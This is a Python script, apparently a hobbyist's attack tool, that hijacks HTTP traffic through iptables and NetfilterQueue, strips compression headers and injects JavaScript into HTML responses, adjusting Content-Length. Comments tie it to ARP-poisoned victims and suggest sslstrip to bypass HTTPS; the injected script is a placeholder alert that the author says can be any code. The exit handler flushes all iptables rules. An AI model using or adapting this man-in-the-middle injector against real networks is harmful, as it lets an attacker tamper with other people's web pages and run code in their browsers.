#!/usr/bin/env python

# this and my other programs work only on http websites,later u can use it to bypass https websites using sslstrip

import netfilterqueue
import subprocess
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def packet_interpreter(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                print(scapy_packet.show())
                # inject whatever js code i want
                injection_code = "<script>alert('test');</script>"
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    # recalculate content length
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass

    packet.accept()


try:
    # For Real Arp Poisoned PC
    # subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
    # subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)

    # To Test Code on Local PC
    subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, packet_interpreter)
    queue.run()
except KeyboardInterrupt:
    print('\nFlushing IP Tables')

    # To Disable IP Forwarding
    # subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward', shell=True)
    subprocess.call('iptables --flush', shell=True)
